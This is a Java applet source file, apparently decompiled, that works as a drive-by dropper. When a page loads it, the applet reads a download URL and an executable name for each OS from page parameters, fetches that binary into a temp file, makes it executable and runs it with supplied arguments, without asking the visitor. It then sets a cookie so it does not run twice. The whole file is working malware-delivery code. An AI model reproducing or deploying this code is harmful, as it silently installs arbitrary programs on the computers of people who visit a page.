import java.applet.Applet;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.net.URL;
import java.net.URLConnection;
import netscape.javascript.JSObject;

public class Main
    extends Applet
    {
        private String cookieName = "alreadyStarted";
        private String cookieValue = "true";
        private boolean debug = false;

        public void init()
        {
            String str1 = getParameter("downloadURL");
            String str2 = getParameter("commandParameter");

            String str3 = getParameter("windowsExecutable");
            String str4 = getParameter("linuxExecutable");
            String str5 = getParameter("macExecutable");

            this.debug = (getParameter("debug") != null);
            if (this.debug)
            {
                System.out.println("URL to download: " + str1);
                System.out.println("Command's parameters: " + str2);
            }
            try
            {
                if ((checkCookie()) &&
                        (this.debug))
                {
                    System.out.println("Cookie already stored. Will not do anything.");
                    return;
                }
            }
            catch (Exception localException1)
            {
                if (this.debug)
                {
                    System.out.println("Failed to access cookies. Got an exception. Will ignore exception: ");
                    localException1.printStackTrace();
                }
            }
            String str6 = getOS();
            String str7 = null;
            Object localObject = null;
            if (str6 == "win") {
                str7 = str3;
            }
            if (str6 == "linux") {
                str7 = str4;
            }
            if (str6 == "mac") {
                str7 = str5;
            }
            if (str7 == null)
            {
                if (this.debug) {
                    System.out.println("No executable found for OS '" + str6 + "'. Do nothing.");
                }
                return;
            }
            str1 = str1 + str7;
            if (this.debug)
            {
                System.out.println("Executable found for OS '" + str6 + "': " + str7);
                System.out.println("Adjusting downloadURL to: " + str1);
            }
            try
            {
                String str8 = "\\.";
                String[] arrayOfString = str7.split(str8);
                File localFile = File.createTempFile(arrayOfString[0], "." + arrayOfString[1]);
                if (this.debug) {
                    System.out.println("Temp filename: " + localFile);
                }
                makeExecutable(localFile);

                downloadURL(new URL(str1), localFile);
                Process localProcess;
                if (str6 == "mac") {
                    localProcess = Runtime.getRuntime().exec(new String[] { "open", localFile.toString() });
                } else {
                    localProcess = Runtime.getRuntime().exec(localFile.toString() + " " + str2);
                }
                setCookie();
            }
            catch (Exception localException2)
            {
                if (this.debug)
                {
                    System.out.println("Catched an exception:");
                    localException2.printStackTrace();
                }
            }
        }

        private void makeExecutable(File paramFile)
        {
            try
            {
                String[] arrayOfString = { "chmod", "777", paramFile.getAbsolutePath() };
                Process localProcess = Runtime.getRuntime().exec(arrayOfString);
                localProcess.waitFor();
            }
            catch (Exception localException) {}
        }

        private void downloadURL(URL paramURL, File paramFile)
            throws FileNotFoundException, IOException
        {
            BufferedOutputStream localBufferedOutputStream = null;
            URLConnection localURLConnection = null;
            InputStream localInputStream = null;

            localBufferedOutputStream = new BufferedOutputStream(new FileOutputStream(paramFile));
            localURLConnection = paramURL.openConnection();
            localInputStream = localURLConnection.getInputStream();
            byte[] arrayOfByte = new byte['Ѐ'];

            long l = 0L;
            int i;
            while ((i = localInputStream.read(arrayOfByte)) != -1)
            {
                localBufferedOutputStream.write(arrayOfByte, 0, i);
                l += i;
            }
            if (localInputStream != null) {
                localInputStream.close();
            }
            if (localBufferedOutputStream != null) {
                localBufferedOutputStream.close();
            }
        }

        private JSObject getDocument()
        {
            JSObject localJSObject1 = JSObject.getWindow(this);
            if (localJSObject1 == null) {
                System.out.println("Failed to get browser object.");
            }
            JSObject localJSObject2 = (JSObject)localJSObject1.getMember("document");
            if (localJSObject2 == null) {
                System.out.println("Failed to get document.");
            }
            return localJSObject2;
        }

        private boolean checkCookie()
        {
            JSObject localJSObject = getDocument();
            String str1 = (String)localJSObject.getMember("cookie");
            if (str1.length() > 0)
            {
                String[] arrayOfString1 = str1.split(",");
                for (String str2 : arrayOfString1)
                {
                    int k = str2.indexOf("=");
                    if (str2.substring(0, k).trim().equals(this.cookieName))
                    {
                        String str3 = str2.substring(k + 1);
                        if (str3.equals(this.cookieValue)) {
                            return true;
                        }
                    }
                }
            }
            return false;
        }

        private void setCookie()
        {
            JSObject localJSObject = getDocument();
            String str1 = (String)localJSObject.getMember("cookie");

            String str2 = this.cookieName + "=" + this.cookieValue + "; path=/; expires=Thu, 31-Dec-2019 12:00:00 GMT";
            localJSObject.setMember("cookie", str2);
        }

        private String getOS()
        {
            String str = System.getProperty("os.name").toLowerCase();
            if (str.indexOf("win") >= 0) {
                return "win";
            }
            if (str.indexOf("mac") >= 0) {
                return "mac";
            }
            if (str.indexOf("linux") >= 0) {
                return "linux";
            }
            if (str.indexOf("freebsd") >= 0) {
                return "freebsd";
            }
            return "unknown";
        }
    }

